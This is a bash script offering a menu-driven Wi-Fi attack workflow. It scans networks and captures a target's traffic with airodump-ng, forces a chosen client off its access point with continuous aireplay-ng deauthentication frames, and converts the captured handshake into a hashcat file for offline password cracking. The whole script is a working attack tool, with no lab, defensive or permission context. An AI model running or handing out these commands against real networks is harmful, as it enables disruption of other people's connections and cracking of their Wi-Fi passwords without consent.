#ENG_ALADDIN
#!/bin/bash
# Function to open new terminal window and run command
function open_terminal_and_run {
    gnome-terminal -- bash -c "$1; exec bash"
}

# Initialize count variable
count=0

while [ $count -ne 1 ]
do 
    # Display options
    echo "1. Display networks"
    echo "2. Capture network traffic"
    echo "3. Deauthenticate a client"
    echo "4. Convert to hashcat file"
    echo "5. Finish program"

    # Read user choice
    read -p "Enter your choice: " choice

    # Switch case to handle user choice
    case $choice in
        1)
            open_terminal_and_run "sudo airodump-ng wlan0"
            ;;
        2)
            read -p "Enter the BSSID of the network you want to target: " bssid
            read -p "Enter the channel of the network: " channel 
            read -p "Enter the output file prefix to save the captured data: " output_prefix
            open_terminal_and_run "sudo airodump-ng --bssid $bssid -c $channel -w ~/Desktop/$output_prefix --output-format pcap wlan0"
            ;;
        3)
            read -p "Enter the BSSID of the network: " network_bssid
            read -p "Enter the MAC address of the client device you want to deauthenticate: " client_mac
            open_terminal_and_run "sudo aireplay-ng --deauth 0 -a $network_bssid -c $client_mac wlan0"
            ;;
        4)
            read -p " Enter the output " output_prefix
            open_terminal_and_run "sudo hcxpcapngtool -o ~/Desktop/${output_prefix}.hc22000 ~/Desktop/${output_prefix}-01.cap"
            ;;
        5)
            count=1
            ;;
        *)
            echo "Please enter a number between 1 and 5."
            ;;
    esac
done
